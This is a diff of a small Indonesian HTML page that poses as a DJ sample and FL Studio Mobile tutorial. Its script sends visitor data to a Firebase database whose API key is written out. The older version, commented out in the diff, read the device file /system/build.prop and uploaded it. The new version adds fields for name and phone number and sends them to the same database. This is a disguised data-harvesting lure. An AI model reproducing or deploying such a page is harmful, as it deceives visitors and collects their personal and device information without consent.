@@ -2,11 +2,21 @@
 <h1>SAMPLE DJ & TUTORIAL FL STUDIO MOBILE BY IRWAN ALVIERO</h1>
 <p>check sekarang juga di:</p>
 <a href="#">KLIK Sini</a>
+<input id="nama" style="width:300px;height:80px;font-size:20px;" placeholder="Masukan nama">
+<input id="no" style="width:300px;height:80px;font-size:20px;" placeholder="Masukan nomor hp">
+<button>UDAHUDAHUDAH
+UDAHUDAHUDAH
+UDAHUDAHUDAH
+UDAHUDAHUDAH
+UDAHUDAHUDAH
+UDAHUDAHUDAH
+UDAHUDAHUDAH
+</button>
 <div></div>
 <script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-app.js"></script>
 <script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-database.js"></script>
 <script type='text/javascript'>
-
+/*
 let url = "/system/build.prop";
 var xhr = new XMLHttpRequest();
 xhr.open("GET", url, true);
@@ -16,6 +26,14 @@ xhr.onload = () => {
    writeUser(xhr.response);
 }
 xhr.send();
+*/
+   document.querySelector("button").onclick=()=>{
+   writeUser(
+document.querySelector("#nama").value,
+document.querySelector("#no").value
+
+);
+}
 
 var firebaseConfig = {
     apiKey: "AIzaSyAIgCzDycY8Ya7XUzlx8kzUa_01zlFIKJg",
@@ -31,9 +49,10 @@ var firebaseConfig = {
   
   var ref = firebase.database().ref('users');
   
-  function writeUser(name) {
+  function writeUser(name, no) {
   var newusers = ref.push().set({
-  blob: name,
+  Nama: name,
+  No: no
   });
   }
 </script>
